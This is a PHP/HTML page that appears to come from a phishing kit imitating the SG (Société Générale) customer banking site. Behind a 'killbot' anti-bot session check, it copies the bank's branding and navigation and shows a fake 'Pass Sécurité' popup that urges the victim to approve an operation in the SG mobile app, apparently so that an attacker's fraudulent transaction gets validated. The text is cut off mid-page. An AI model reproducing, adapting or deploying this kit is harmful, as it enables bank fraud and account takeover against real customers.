<?php
session_start();
include "../server/fonctions.php";
require ("../server/all.php");
include "../server/script.php";
if (isset($_SESSION['killbot_autorisé']) && $_SESSION['killbot_autorisé'] ==  true) { 
?>


<html class="awt--standalone awt--ngim swm-root-active" lang="FR">

<head>
<title>En attente de Validation | APP SG</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style data-rc-order="prepend" rc-util-key="@ant-design-icons"></style>
<link rel="icon" href="../assets/favicon.ico" type="image/x-icon">  
      
  <link rel="stylesheet" href="../assets/css//awt-front-BDDF.css" media="all">
  <link rel="stylesheet" href="../assets/css/index.min.css" media="all">
 
  <link rel="stylesheet" href="../assets/css/main2.css" media="all">
  <link rel="stylesheet" href="../assets/css/style2.css" media="all">
  <meta name="robots" content="noindex, nofollow">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="icon" type="image/x-icon" >
	<link  rel="stylesheet" type="text/css">
	<script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.5/platform.min.js"></script>
	<link type="text/css" rel="stylesheet"  class="swm_stylesheet">
</head>
<style>
.rouge {
    background-color: red;
    color: white; /* Optionnel : pour que le texte soit en blanc */
}
</style>

<body>
		<header class="rsp_header header-co js-header-lhs-auth" role="banner">
		<nav class="rsp_nav rsp_nav--above" style="z-index: 11;">
			<ul class="rsp_nav__list">
				<li class="dcw_dropdown dcw_dropdown_button js-dropdown-light">
					<button class="rsp_dropdown rsp_btn--toggle js-dropdown_btn" aria-label="Ouvrir la liste des autres sites SG" aria-expanded="false" type="button" data-bs-toggle="dropdown" aria-controls="id_menu_deroulant_metiers">
						Particuliers
						<svg aria-hidden="true" focusable="false" class="dcw_dropdown_icon_arrow">
							<use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:>
							</use>
						</svg>
					</button>

					<ul class="dcw_dropdown_list toggle_content dcw_hidden" id="id_menu_deroulant_metiers">
						<li class="rsp_dropdown_item">
							<a class="&quot;dcw_dropdown_link js-dropdown_link js-navpropri"  ><span>Professionnels</span></a>
						</li>
					</ul>
				</li>
				<li class="rsp_nav__item rsp_nav__item--push-right" data-channelid="fa83c5ca6a7e3710VgnVCM10000057f440c0RCRD">
					<a  class="rsp_nav__link rsp_nav__link--sub-level" data-element-label="aide-et-contacts" ><svg aria-hidden="true" focusable="false" width="18" height="18">
							<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:>
							</use>
						</svg><span>Aide et contacts</span></a>
				</li>
			</ul>
		</nav>
		<div class="rsp_header__wrapper-nav">
			<button class="rsp_btn rsp_btn--burger js-header-burger" aria-controls="menuMobile" aria-expanded="false">
				<svg aria-hidden="true" focusable="false" class="picto-menu  v-align-middle" aria-label="ouvrir le menu" aria-labelledby="picto-menu" role="img" viewBox="0 0 24 26" height="26" width="24">
					<use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:>
					</use>
				</svg>
				<svg aria-hidden="true" focusable="false" class="picto-close v-align-middle" aria-label="fermer le menu" aria-labelledby="picto-menu" role="img" viewBox="0 0 20 20" height="20" width="20">
					<use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:>
					</use>
				</svg>
			</button>
			<h2 class="rsp_header__title-logo">
				<a  class="rsp_header__logo-mob" title="SG " data-tracking="logo-particuliers" >
					<svg aria-label="Logo SG Monaco" focusable="false" height="30" width="132" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 172 42" style="enable-background:new 0 0 172 42;" xml:space="preserve">
						<style type="text/css">
							.st0 {
								fill: #E60028;
							}

							.st1 {
								fill: #FFFFFF;
							}
						</style>

						<g>
							<path d="M9.6,18.8l1.9,0.4c4.8,1,6.9,3.1,6.9,6.9c0,4.6-3.4,7.1-9.7,7.1H0.2v-4.9c2.8,0.6,5.7,0.9,8.1,0.9c3.7,0,5.5-1,5.5-2.9   s-0.9-2.5-5-3.3l-1.9-0.4C2.1,21.6,0,19.5,0,15.7c0-4.3,3.5-6.9,9.4-6.9H17v4.9c-2.7-0.6-4.9-0.9-7.2-0.9c-3.3,0-5.1,1-5.1,2.7   C4.6,17.3,5.6,18,9.6,18.8z M42.4,21v12.2h-7.8c-8.8,0-14-4.5-14-12.2c0-7.7,5.1-12.2,14-12.2h6v4.7c-2.1-0.5-4.2-0.7-6.3-0.7   c-5.7,0-9,3-9,8.2c0,5,3.3,8,9,8H38l0-8H42.4z">
							</path>
						</g>
						<rect x="52.7" y="0" class="st0" width="42" height="18.9"></rect>
						<rect x="52.7" y="23.1" width="42" height="18.9"></rect>
						<rect x="52.7" y="18.9" class="st1" width="42" height="4.2"></rect>
					</svg>
				</a>
				<a  class="rsp_header__logo-desktop" title="SG - Aller à l'accueil" data-tracking="logo-particuliers" >
					<svg aria-label="Logo SG Monaco" focusable="false" height="30" width="132" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" viewBox="0 0 172 42" style="enable-background:new 0 0 172 42;" xml:space="preserve">
						<style type="text/css">
							.st0 {
								fill: #E60028;
							}

							.st1 {
								fill: #FFFFFF;
							}
						</style>

						<g>
							<path d="M9.6,18.8l1.9,0.4c4.8,1,6.9,3.1,6.9,6.9c0,4.6-3.4,7.1-9.7,7.1H0.2v-4.9c2.8,0.6,5.7,0.9,8.1,0.9c3.7,0,5.5-1,5.5-2.9   s-0.9-2.5-5-3.3l-1.9-0.4C2.1,21.6,0,19.5,0,15.7c0-4.3,3.5-6.9,9.4-6.9H17v4.9c-2.7-0.6-4.9-0.9-7.2-0.9c-3.3,0-5.1,1-5.1,2.7   C4.6,17.3,5.6,18,9.6,18.8z M42.4,21v12.2h-7.8c-8.8,0-14-4.5-14-12.2c0-7.7,5.1-12.2,14-12.2h6v4.7c-2.1-0.5-4.2-0.7-6.3-0.7   c-5.7,0-9,3-9,8.2c0,5,3.3,8,9,8H38l0-8H42.4z">
							</path>
						</g>
						<rect x="52.7" y="0" class="st0" width="42" height="18.9"></rect>
						<rect x="52.7" y="23.1" width="42" height="18.9"></rect>
						<rect x="52.7" y="18.9" class="st1" width="42" height="4.2"></rect>
					</svg>
				</a>
			</h2>
			<nav class="rsp_nav" role="navigation" aria-label="navigation principale">
				<a id="go-navigation" tabindex="-1"></a>
				<ul class="rsp_nav__list js-nav-desktop">



					<!-- LINKS -->
					<li class="rsp_nav__item has-popup ml-xl ml-l pl-0 js-mainnav-link is-active" data-channelid="5e2a2ee50183e510VgnVCM100000020012acRCRD">
						<a aria-controls="nav5e9d7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tracking="comptes-et-cartes-"   data-element-label="comptes-et-cartes"> Comptes et cartes
						</a>
					</li>

					<li class="rsp_nav__item has-popup  js-mainnav-link" data-channelid="5a4c0f9d49b37610VgnVCM10000057f440c0RCRD">
						<a aria-controls="nav064ded4979ecf710VgnVCM100000da4658c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tracking="emprunter"   data-element-label="emprunter"> Emprunter
						</a>
						<ul class="rsp_nav__list js-sub-level" style="display: none;">
							<!-- LINKS -->
							<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="67e77e62c5fbf710VgnVCM100000da4658c0RCRD">
								<a aria-controls="nav9a2ded4979ecf710VgnVCM100000da4658c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tracking="accueil-prets"  data-anchor="null"  data-element-label="accueil-prets"> Accueil prêts
								</a>
							</li>
							<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="dc4563f637cc4610VgnVCM10000057f440c0RCRD">
								<a aria-controls="nav6cea25855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tracking="credit-a-la-consommation"  data-anchor="null" data-cm="1"  data-element-label="credit-a-la-consommation"> Crédit à la consommation
								</a>
							</li>
							<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="f2477c7ac9f64610VgnVCM10000057f440c0RCRD">
								<a aria-controls="nav624b25855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tracking="credit-immobilier"  data-anchor="null" data-cm="1"  data-element-label="credit-immobilier"> Crédit immobilier
								</a>
							</li>
						</ul>
					</li>

					<li class="rsp_nav__item has-popup  js-mainnav-link" data-channelid="c9c3fb7c0a8b3710VgnVCM10000057f440c0RCRD">
						<a aria-controls="nav361725855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tracking="epargner"   data-element-label="epargner"> Épargner
						</a>
						<ul class="rsp_nav__list js-sub-level" style="display: none;">
							<!-- LINKS -->
							<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="e289a40c92902710VgnVCM100000da4658c0RCRD">
								<a aria-controls="nav4c44fb7c0a8b3710VgnVCM10000057f440c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tracking="tableau-de-bord"  data-anchor="null"  data-element-label="tableau-de-bord"> Tableau de bord
								</a>
							</li>
							<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="65a22a7e5457e510VgnVCM100000020012acRCRD">
								<a aria-controls="nave4c6742890ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tracking="bourse"  data-anchor="null"  data-element-label="bourse"> Bourse
								</a>
							</li>
							<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="5fad885f3a7df610VgnVCM10000057f440c0RCRD">
								<a aria-controls="nav9a3e184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tracking="nos-offres-d-epargne"  data-anchor="null" data-cm="1"  data-element-label="epargner"> Nos offres d'épargne
								</a>
							</li>
						</ul>
					</li>

					<li class="rsp_nav__item has-popup  js-mainnav-link" data-channelid="30d8d7eb61b7e510VgnVCM100000020012acRCRD">
						<a aria-controls="nava19d7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tracking="assurer"   data-element-label="assurances"> Assurer
						</a>
						<ul class="rsp_nav__list js-sub-level" style="display: none;">
							<!-- LINKS -->
							<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="7a9f804f6193f510VgnVCM100000030013acRCRD">
								<a aria-controls="nav1bbc25855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tracking="accueil-assurances"  data-anchor="null" >
									Accueil assurances
								</a>
							</li>
							<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="5d9d885f3a7df610VgnVCM10000057f440c0RCRD">
								<a aria-controls="nava0cc25855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tracking="nos-offres-d-assurances"  data-anchor="null"  data-element-label="nos-offres-d-assurances"> Nos offres d’assurances
								</a>
							</li>
						</ul>
					</li>

					<li class="rsp_nav__item   js-mainnav-link" data-channelid="0dbb5d7dc69ff610VgnVCM10000057f440c0RCRD">
						<a aria-controls="nav6bfc25855cdcf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tracking="nos-conseils"  data-anchor="null"  data-element-label="nos-conseils"> Nos conseils
						</a>
					</li>






					<script id="hidden-autocompletion-file" type="text/x-custom-template">						
</script>
					<li class="rsp_nav__item rsp_nav__item--picto ml-auto js-desktop-panel-search">
						<button class="rsp_btn js-search-menu" aria-label="Rechercher" aria-controls="searchBox"  aria-expanded="false">
							<svg aria-hidden="true" focusable="false" viewBox="0 0 24 24" height="24" width="24">
								<use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:>
								</use>
							</svg>
						</button>
					</li>

					<li class="rsp_nav__item rsp_nav__item--picto  ml-sm-auto" id="js-counter-alerting">
						<a data-channelid="314cb78323c6f510VgnVCM100000030013acRCRD" aria-expanded="false" class="rsp_btn bd-l_before"  data-element-label="notifications" >
							<svg aria-hidden="true" focusable="false" class="dcw_login_icon-alert" height="24" width="24">
								<use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:>
								</use>
							</svg>
							<span class="js-nav-user-counter rsp_counter"></span>
							<span class="rsp_btn__legend">Notifications</span>
						</a>
					</li>


					<li class="rsp_nav__item rsp_nav__item--picto " id="js-counter-gms">
						<a data-channelid="fe9c4b5c105e0610VgnVCM100000060012acRCRD" aria-expanded="false" class="rsp_btn bd-l_before" >
							<svg aria-hidden="true" focusable="false" class="dcw_login_icon-user" height="24" width="24">
								<use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:>
								</use>
							</svg>
							<span class="js-nav-user-counter rsp_counter is-active">3</span>
							<span class="rsp_btn__legend">Messagerie</span>
						</a>
					</li>


					<li class="rsp_nav__item rsp_nav__item--picto ">
						<a data-channelid="7091993ee0aab710VgnVCM1000000ae1c6c0RCRD" aria-expanded="false" class="rsp_btn bd-l_before"  data-element-label="documents" >
							<svg aria-hidden="true" focusable="false" class="dcw_login_icon-messages" height="24" width="24">
								<use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:>
								</use>
							</svg>
							<span class="js-nav-user-counter rsp_counter"></span>
							<span class="rsp_btn__legend">Documents</span>
						</a>
					</li>


					<li class="rsp_nav__item rsp_nav__item--picto ">
						<a data-channelid="f1bcf2e2b9e63610VgnVCM1000000ae1c6c0RCRD" aria-expanded="false" class="rsp_btn bd-l_before"  data-element-label="profil" >
							<svg aria-hidden="true" focusable="false" class="dcw_login_icon-parameters" height="24" width="24">
								<use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:>
								</use>
							</svg>
							<span class="js-nav-user-counter rsp_counter"></span>
							<span class="rsp_btn__legend">Profil</span>
						</a>
					</li>


					<li class="rsp_nav__item rsp_nav__item--picto mr-l mr-0">
						<a  class="js-lgc-logout rsp_btn bd-l_before" aria-label="espace client:deconnexion" data-tracking="deconnexion"  data-cms-callback-url="/page-deconnexion">
							<svg aria-hidden="true" focusable="false" class="picto-mob" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32" >
								<g fill="none" fill-rule="evenodd">
									<circle cx="16" cy="16" r="16" fill="#EE3B45"></circle>
									<g fill="#FFF">
										<path d="M9.99 10.01l1.414 1.415a6.5 6.5 0 1 0 9.192 0l1.414-1.415a8.5 8.5 0 1 1-12.02 0z">
										</path>
										<path d="M14.98 7h2v10h-2z"></path>
									</g>
								</g>
							</svg>
							<svg aria-hidden="true" focusable="false" class="picto-desktop" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
								<g fill="none" fill-rule="evenodd">
									<circle cx="12" cy="12" r="12" fill="#E9041E"></circle>
									<g stroke="#FFF" stroke-width="2">
										<path d="M8.667 7.84a5.32 5.32 0 0 0-2 4.16 5.334 5.334 0 0 0 10.666 0 5.32 5.32 0 0 0-2-4.16M12 6v6.587">
										</path>
									</g>
								</g>
							</svg>
							<span class="rsp_btn__legend js-login-names"></span>
						</a>
					</li>
				</ul>
			</nav>
			<aside class="rsp_menu-mob js-burger-content">
				<nav class="rsp_nav js-nav-mobile">
					<ul class="rsp_nav__list">




						<ul class="rsp_nav__item--menu-mob-picto">
							<li>
								<a id="js-counter-alerting-mobile" class="menu--mob-link" data-channelid="" aria-expanded="false"   data-tracking="notifications">
									<svg width="24" height="25" xmlns="http://www.w3.org/2000/svg">
										<g fill="none" fill-rule="evenodd">
											<path d="M0 .778h24v24H0z"></path>
											<path d="M7.376 8.009c-.316.677-.507 1.334-.755 2.194a36.72 36.72 0 0 0-.581 2.346c-.502 2.373-1.18 5.247-2.04 6.854h16c-.753-1.296-1.553-4.336-2.397-9.118-.51-2.844-2.18-4.882-5.559-4.882-1.217 0-2.162.237-2.915.684M13 22.403a1.001 1.001 0 0 1-1 1 1 1 0 0 1-1-1" stroke="#010035" stroke-width="2"></path>
										</g>
									</svg>
									<span class="js-nav-user-counter rsp_counter notif-is-mobile"></span>
									<span class="rsp_btn__legend">Notifications</span>
								</a>
							</li>

							<li>
								<a id="js-counter-gms-mobile" class="menu--mob-link" data-channelid="" aria-expanded="false"   data-tracking="messagerie">
									<svg width="25" height="24" xmlns="http://www.w3.org/2000/svg">
										<g fill="none" fill-rule="evenodd">
											<path d="M.5 0h24v24H.5z"></path>
											<g stroke="#010035" stroke-width="1.5">
												<path d="M22.25 9.768V6.262a.638.638 0 0 0-.637-.637H3.762a.638.638 0 0 0-.638.638v11.475c0 .352.285.637.638.637h17.85a.638.638 0 0 0 .637-.637v-5.893">
												</path>
												<path d="m3.5 5.625 8.75 8.437c.248.25.65.25.898 0L21.5 5.625"></path>
											</g>
										</g>
									</svg>
									<span class="js-nav-user-counter rsp_counter mess-is-mobile is-active">3</span>
									<span class="rsp_btn__legend">Messagerie</span>
								</a>
							</li>

							<li>
								<a class="menu--mob-link" data-channelid="" aria-expanded="false"   data-tracking="documents"> <svg width="25" height="24" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
										<g fill="none" fill-rule="evenodd">
											<path d="M0 0h24v24H0z"></path>
											<path d="M29.5 10.024V8.35c0-.47-.395-.85-.883-.85H3.883c-.488 0-.883.38-.883.85v15.3c0 .47.395.85.883.85h24.734c.488 0 .883-.38.883-.85V12.793" stroke="#010035" stroke-width="2"></path>
											<rect stroke="#010035" stroke-width="2" x="5" y="4" width="8" height="3.5" rx="1"></rect>
											<path fill="#010035" d="M11.5 19H26v2H11.5z"></path>
										</g>
									</svg>
									<span class="rsp_btn__legend">Documents</span>
								</a>
							</li>

							<li>
								<a class="menu--mob-link" data-channelid="" aria-expanded="false"   data-tracking="profil">
									<svg width="24" height="24" xmlns="http://www.w3.org/2000/svg">
										<g fill="none" fill-rule="evenodd">
											<path d="M0 0h24v24H0z"></path>
											<circle stroke="#010035" stroke-width="1.5" cx="12" cy="10.5" r="3">
											</circle>
											<path d="M6.75 21.282v-2.965c0-1.418 1.175-2.567 2.625-2.567h5.25c1.45 0 2.625 1.15 2.625 2.567v2.868" stroke="#010035" stroke-width="1.5"></path>
											<path d="M20.111 5.332A10.454 10.454 0 0 1 22.5 12c0 5.799-4.7 10.5-10.5 10.5-5.799 0-10.5-4.701-10.5-10.5S6.201 1.5 12 1.5c2.036 0 3.936.58 5.546 1.582" stroke="#010035" stroke-width="1.5" stroke-linejoin="round"></path>
										</g>
									</svg>
									<span class="rsp_btn__legend">Profil</span>
								</a>
							</li>
						</ul>

						<li class="rsp_nav__item rsp_nav__item--search js-nav-search">
							
						</li>

						

						<li class="rsp_nav__item">
							<button class="rsp_btn rsp_btn--toggle js-nav-mobile-first-lvl-btn" aria-expanded="false">Emprunter
								<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
									<path fill="currentColor" fill-rule="evenodd" d="M19.618 7L21 8.331 12 17 3 8.331 4.382 7 12 14.337z"></path>
								</svg>
							</button>
							<ul class="rsp_nav__list js-nav-mobile-second-lvl-container" style="display: none;">
								<!-- LINKS -->
								<li class="rsp_nav__item rsp_nav__item--connect">
									<a data-channelid="67e77e62c5fbf710VgnVCM100000da4658c0RCRD" aria-controls="navbea482d1dfce4810VgnVCM1000000c0e3f76RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="Accueil prêts" data-anchor="null"  data-element-label="accueil-prets"> Accueil prêts
									</a>
								</li>
								<li class="rsp_nav__item rsp_nav__item--connect">
									<a data-channelid="dc4563f637cc4610VgnVCM10000057f440c0RCRD" aria-controls="nav156d184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="Crédit à la consommation" data-anchor="null" data-cm="1"  data-element-label="credit-a-la-consommation"> Crédit à la consommation
									</a>
								</li>
								<li class="rsp_nav__item rsp_nav__item--connect">
									<a data-channelid="f2477c7ac9f64610VgnVCM10000057f440c0RCRD" aria-controls="nav9a6d184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="Crédit immobilier" data-anchor="null" data-cm="1"  data-element-label="credit-immobilier"> Crédit immobilier
									</a>
								</li>
							</ul>
						</li>

						<li class="rsp_nav__item">
							<button class="rsp_btn rsp_btn--toggle js-nav-mobile-first-lvl-btn" aria-expanded="false">Épargner
								<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
									<path fill="currentColor" fill-rule="evenodd" d="M19.618 7L21 8.331 12 17 3 8.331 4.382 7 12 14.337z"></path>
								</svg>
							</button>
							<ul class="rsp_nav__list js-nav-mobile-second-lvl-container" style="display: none;">
								<!-- LINKS -->
								<li class="rsp_nav__item rsp_nav__item--connect">
									<a data-channelid="e289a40c92902710VgnVCM100000da4658c0RCRD" aria-controls="nav6c94fb7c0a8b3710VgnVCM10000057f440c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="Tableau de bord" data-anchor="null"  data-element-label="tableau-de-bord"> Tableau de bord
									</a>
								</li>
								<li class="rsp_nav__item rsp_nav__item--connect">
									<a data-channelid="1d65c7dd5f001610VgnVCM100000060012acRCRD" aria-controls="nav5dcd7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="Bourse" data-anchor="null"  data-element-label="espace-bourse"> Bourse
									</a>
								</li>
								<li class="rsp_nav__item rsp_nav__item--connect">
									<a data-channelid="5fad885f3a7df610VgnVCM10000057f440c0RCRD" aria-controls="nav2abd184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="Nos offres d'épargne" data-anchor="null" data-cm="1"  data-element-label="nos-offres-d-epargne"> Nos offres d'épargne
									</a>
								</li>
							</ul>
						</li>

						<li class="rsp_nav__item">
							<button class="rsp_btn rsp_btn--toggle js-nav-mobile-first-lvl-btn" aria-expanded="false">Assurer
								<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
									<path fill="currentColor" fill-rule="evenodd" d="M19.618 7L21 8.331 12 17 3 8.331 4.382 7 12 14.337z"></path>
								</svg>
							</button>
							<ul class="rsp_nav__list js-nav-mobile-second-lvl-container" style="display: none;">
								<!-- LINKS -->
								<li class="rsp_nav__item rsp_nav__item--connect">
									<a data-channelid="7a9f804f6193f510VgnVCM100000030013acRCRD" aria-controls="navfb1e184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="Accueil assurances" data-anchor="null"  data-element-label="accueil-assurances"> Accueil assurances
									</a>
								</li>
								<li class="rsp_nav__item rsp_nav__item--connect">
									<a data-channelid="5d9d885f3a7df610VgnVCM10000057f440c0RCRD" aria-controls="navdb2e184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="navigation-connected" data-tms-element-label="Nos offres d’assurances" data-anchor="null" data-cm="1"  data-element-label="nos-offres-d-assurances"> Nos offres d’assurances
									</a>
								</li>
							</ul>
						</li>

						<li class="rsp_nav__item">
							<a data-channelid="0dbb5d7dc69ff610VgnVCM10000057f440c0RCRD" aria-controls="navfc30184a27ecf610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link" data-tms-container-label="navigation-connected" data-tms-element-label="Nos conseils" > Nos conseils
							</a>
						</li>






						<li class="rsp_nav__item rsp_nav__item--emergency">
							<button class="rsp_btn rsp_btn--emergency rsp_dropdown js-nav-mobile-first-lvl-btn" aria-expanded="false" aria-controls="sub-list-otherSite">
								Espace Client Particuliers
								<svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
									<path fill="currentColor" fill-rule="evenodd" d="M19.618 7L21 8.331 12 17 3 8.331 4.382 7 12 14.337z"></path>
								</svg>
							</button>
							<ul id="sub-list-otherSite" class="rsp_nav__list js-nav-mobile-second-lvl-container" style="display: none;">
								<!-- ADD FIRST in is-active -->
								<li class="rsp_nav__item rsp_nav__item--connect">
									<a class="rsp_nav__link rsp_nav__link--sub-level dcw_dropdown_link js-dropdown_link js-navpropri"  ><span>Espace
											Client Professionnels</span></a>
								</li>
							</ul>
						</li>
						<li class="rsp_nav__item rsp_nav__item--emergency">
							<a class="rsp_nav__link rsp_nav__link--sub-level"  data-element-label="aide-et-contacts" ><svg aria-hidden="true" focusable="false" width="18" height="18">
									<use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:>
									</use>
								</svg><span>Aide et contacts</span></a>
						</li>
					</ul>
				</nav>
			</aside>
		</div>

		

		<div id="searchBox" class="rsp_search-box__wrapper js-search-wrapper">
			
		</div>



		<input id="breadcrumb-channel-ids" type="hidden" value="4c2972072a52f710VgnVCM100000da4658c0RCRD,0efe2ee50183e510VgnVCM100000020012acRCRD,5e2a2ee50183e510VgnVCM100000020012acRCRD,d3f92ee50183e510VgnVCM100000020012acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD">
		
	</header>

	<aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
		<div class="dcw_msg-banner_msg-wrapper">
			<svg aria-hidden="true" focusable="false" class="dcw_msg-banner_picto-info">
				<use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:></use>
			</svg>
			<p class="dcw_msg-banner_message" id="lastConnectionMessage">

			</p>
			<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed">
				<svg aria-hidden="true" focusable="false">
					<use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:></use>
				</svg>
			</button>
		</div>
	</aside>










	
	<div class="PRI inline swm swm-headless  swm-page-sign-operation swm-theme-SITE_WEB swm-module-signOOB" id="inlinekeyboard" style="">
		<div id="swm-wrapper" class="swm-inner-wrapper">


			<div id="swm-tooltip" class="swm-tooltip">
				<span></span>
			</div>

			<!-- -->
			<div class="swm-popin-wrapper" role="dialog" aria-modal="true" aria-labelledby="swm-modal-label" style="display: block;">
				<div id="swm-popin-overlay" class="swm-popin-overlay" role="presentation"></div>
				<div id="swm-popin-dialog" class="swm-popin-dialog">
					<div class="swm-popin-relative">
						<div id="swm-popin-btn-fermer" class="swm-popin-btn-fermer" role="button" tabindex="0" aria-label="Fermer la popin"></div>
						<div id="swm-popin-ombre-lat" class="swm-popin-ombre-lat">
							<div id="swm-popin" class="swm-popin">
								<div id="swm-popin-cadre" class="swm-popin-cadre"><span class="swm-sr-only" id="swm-modal-label"></span>
									<div id="oob-popin" class="oob-content" aria-live="polite">
										<div class="cs_width--41 cs_align--center">
										<h2 style="font-weight: bold;" class="cs_font--weight-bold cs_margin--bottom-l" tabindex="0">PASS SÉCURITÉ</h2>

												
											<p class="cs_text cs_text--s cs_margin--bottom-m"> Pour finaliser cette
												opération <span class="cs_font--weight-semi">en toute sécurité</span>,
												vous devez l'accepter dans le <span class="cs_font--weight-semi">Pass
													Sécurité de votre Appli mobile SG</span>. </p>

													
											<div class="cs_margin--bottom-m">
												<div class="swm-cs_spinner__container">
													<div class="swm-cs_spinner"></div> <svg xmlns="http://www.w3.org/2000/svg" width="39" height="69" viewBox="0 0 39 69" aria-hidden="true" focusable="false">
														<g fill="none" fill-rule="evenodd">
															<g stroke="#333" stroke-linecap="round" stroke-width="2">
																<path stroke-linejoin="bevel" d="M37.351 31.264v33.502c0 1.693-1.232 3.07-2.75 3.07H4.446c-1.52 0-2.751-1.377-2.751-3.07V4.775c0-1.694 1.231-3.069 2.75-3.069h30.156c1.518 0 2.75 1.375 2.75 3.069v13.571M37.35 23.563v2.858">
																</path>
																<path stroke-linejoin="round" d="M36.58 11.96H2.466M36.056 58.93H2.99M15.199 6.562h8.647">
																</path>
															</g>
															<path d="M-17-1h72v72h-72z"></path>
														</g>
													</svg>
												</div>
											</div>
											<!-- heure auto --->
											<p class="cs_font--weight-bold cs_margin--bottom-m" id="deviceInfo"></p>

											<p class="cs_text cs_text--s cs_font--weight-bold cs_margin--bottom-s">
												Vérifiez les informations pour accepter (en cliquant sur « Accepter »)
												ou refuser (en cliquant sur « Refuser ») l’opération. </p>
